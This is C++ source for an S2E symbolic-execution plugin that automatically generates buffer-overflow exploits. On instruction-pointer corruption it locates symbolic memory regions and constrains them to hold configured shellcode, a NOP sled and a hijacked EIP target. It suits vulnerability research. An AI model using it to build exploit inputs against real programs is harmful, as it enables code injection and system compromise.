#include <s2e/S2E.h>
#include <s2e/S2EExecutor.h>
#include <s2e/Utils.h>
#include <s2e/ConfigFile.h>
#include <klee/Solver.h>
#include <klee/util/ExprUtil.h>
#include "ExploitGenerator.h"

using namespace std;

namespace s2e {
namespace plugins {

S2E_DEFINE_PLUGIN(ExploitGenerator, "Exploit Vulnerabilities", "Exploit Generator",);

void ExploitGenerator::initialize()
{
    m_shellCode = s2e()->getConfig()->getString(getConfigKey() + ".shellCode");
    /**
     * XXX: Generate correct shellcode
     * getString() escapes backslashes, thus, '\x61' becomes "x61"
     */
    m_shellCode = str2byte(m_shellCode);
    s2e()->getMessagesStream() << "ShellCode size: "
                               << m_shellCode.size() << "\n";

    s2e()->getCorePlugin()->onEipCorrupt.connect(
            sigc::mem_fun(*this, &ExploitGenerator::onEipCorrupt));
}

void ExploitGenerator::onEipCorrupt(
        S2EExecutionState *state,
        klee::ref<klee::Expr> eipValue)
{
    /* Address of the beginning of an object */
    set<uint64_t> taintedAddressSet;
    /**
     * first:  start address of a consecutive symbolic data
     * second: width of the symbolic data
     */
    map<uint64_t, uint64_t> symbolicArrayMap;

    m_eipValue = eipValue;

    s2e()->getMessagesStream(state) << "EIP is tainted by "
        << s2e()->getExecutor()->toConstantSilent(*state, m_eipValue)
        << ", original value is " << m_eipValue << "\n";

    findTaintedObjects(state, 0x00000000, 0xFFFFFFFF, &taintedAddressSet);
    findSymbolicArray(state, taintedAddressSet, &symbolicArrayMap);

    map<uint64_t, uint64_t>::iterator it_symbolicArray;
    for (it_symbolicArray = symbolicArrayMap.begin();
            it_symbolicArray != symbolicArrayMap.end(); it_symbolicArray++) {
        generateExploit(state,
            /* startAddress = */ it_symbolicArray->first,
            /* width = */ it_symbolicArray->second);
    }
}

void ExploitGenerator::findTaintedObjects(
        S2EExecutionState *state,
        uint64_t minAddress,
        uint64_t maxAddress,
        set<uint64_t> *taintedAddressSet)
{
    uint64_t hostAddress = 0;
    klee::ObjectPair op;

    for (uint64_t i_pageNumber = minAddress; i_pageNumber <= maxAddress;
            i_pageNumber += TARGET_PAGE_SIZE) {

        /* invalid page fault */
        if (likely(state->getPhysicalAddress(i_pageNumber) == (uint64_t) -1)) {
            continue;
        }

        for (uint64_t j_objectStartAddress = i_pageNumber;
                j_objectStartAddress <= i_pageNumber + TARGET_PAGE_SIZE;
                j_objectStartAddress += S2E_RAM_OBJECT_SIZE) {

            hostAddress = state->getHostAddress(j_objectStartAddress);

            if (hostAddress == (uint64_t) -1) {
                continue;
            }

            op = state->addressSpace.findObject(hostAddress);
            if (op.second->isAllConcrete()) {
                continue;
            }

            taintedAddressSet->insert(j_objectStartAddress);
        }
    }
}

void ExploitGenerator::findSymbolicArray(
        S2EExecutionState *state,
        set<uint64_t> const& taintedAddressSet,
        map<uint64_t, uint64_t> *symbolicArrayMap)
{
    klee::ObjectPair op;
    const klee::MemoryObject *mo;
    const klee::ObjectState *os;

    set<uint64_t>::iterator it_objectStartAddress;
    for (it_objectStartAddress = taintedAddressSet.begin();
            it_objectStartAddress != taintedAddressSet.end();
            it_objectStartAddress++) {

        op = state->addressSpace.findObject(
             state->getHostAddress(*it_objectStartAddress));
        mo = op.first;
        os = op.second;

        bool isPreviousByteConstant = true;
        uint64_t startAddress = 0, width = 0;

        uint64_t i_pageOffset = mo->address & ~S2E_RAM_OBJECT_MASK;
        for (; i_pageOffset < mo->size; i_pageOffset++) {

            klee::ref<klee::Expr> byte = os->read8(i_pageOffset);
            if (!isa<klee::ConstantExpr>(byte)) {
                /* Start of a symbolic array */
                if (isPreviousByteConstant) {
                    startAddress = *it_objectStartAddress | i_pageOffset;
                    width = 1;
                }
                else {
                    width++;
                }
                isPreviousByteConstant = false;
            }
            else {
                /* End of a symbolic array */
                if (!isPreviousByteConstant) {
                    s2e()->getMessagesStream(state)
                        << "Found Symbolic Array at " << hexval(startAddress)
                        << ", width " << width << "\n";
                    symbolicArrayMap->insert(make_pair(startAddress, width));
                }
                isPreviousByteConstant = true;
                continue;
            }
        }
    }
}

void ExploitGenerator::generateExploit(
        S2EExecutionState *state,
        uint64_t startAddress, uint64_t width)
{
    if (width < m_shellCode.size()) {
        s2e()->getMessagesStream(state) << "Not enough space, "
                                        << width << " < "
                                        << m_shellCode.size() << "\n";
        return;
    }

    uint64_t shellCodeAddress = startAddress + width - m_shellCode.size() - 4;
    klee::ref<klee::Expr> byte, eipConstraint, exploitConstraint;

    exploitConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);

    /* shellcode constraint */
    for (int i = 0; i < m_shellCode.size(); i++) {
        byte = klee::EqExpr::create(state->readMemory8(shellCodeAddress + i),
                klee::ConstantExpr::create((uint8_t)m_shellCode[i], klee::Expr::Int8));
        exploitConstraint = klee::AndExpr::create(exploitConstraint, byte);
    }
    s2e()->getMessagesStream(state) << "ShellCode starts at "
                                    << hexval(shellCodeAddress) << ", width "
                                    << m_shellCode.size() << "\n";

    /* nop sled constraint */
    for (int i = 0; i < width - m_shellCode.size() - 4; i++) {
        byte = klee::EqExpr::create(state->readMemory8(startAddress + i),
                klee::ConstantExpr::create(0x90, klee::Expr::Int8));
        exploitConstraint = klee::AndExpr::create(exploitConstraint, byte);
    }
    s2e()->getMessagesStream(state) << "NOP sled starts at "
                                    << hexval(startAddress) << ", width "
                                    << width - m_shellCode.size() << "\n";

    /* eip constraint, eip >= lowerBound && eip < upperBound */
    uint64_t lowerBound = startAddress;
    uint64_t upperBound = shellCodeAddress;
    eipConstraint = klee::AndExpr::create(
            klee::UgeExpr::create(m_eipValue,
                klee::ConstantExpr::create(lowerBound, klee::Expr::Int64)),
            klee::UleExpr::create(m_eipValue,
                klee::ConstantExpr::create(upperBound, klee::Expr::Int64)));
    exploitConstraint = klee::AndExpr::create(
            exploitConstraint, eipConstraint);
    s2e()->getMessagesStream(state) << "Set EIP between "
                                    << hexval(lowerBound) << " and "
                                    << hexval(upperBound) << "\n";

    bool isTrue;
    klee::Solver *solver = s2e()->getExecutor()->getSolver();
    klee::Query query = klee::Query(state->constraints, eipConstraint);
    if (!solver->mayBeTrue(query, isTrue)) {
        s2e()->getMessagesStream(state) << "Cannot generate exploit...\n";
        return;
    }

    state->addConstraint(exploitConstraint);
}

/**
 * input:  "x61x62x63"
 * output: "\x61\x62\x63"
 */
string ExploitGenerator::str2byte(string str) {
    char buf[3] = {'\0'};
    char chr = '\0';
    string byteString;

    for (int i = 0; i < str.size(); i += 3) {
        sprintf(buf, "%c%c", str[i + 1], str[i + 2]);
        chr = strtol(buf, NULL, 16);
        byteString.push_back(chr);
    }

    return byteString;
}

} // namespace plugins
} // namespace s2e
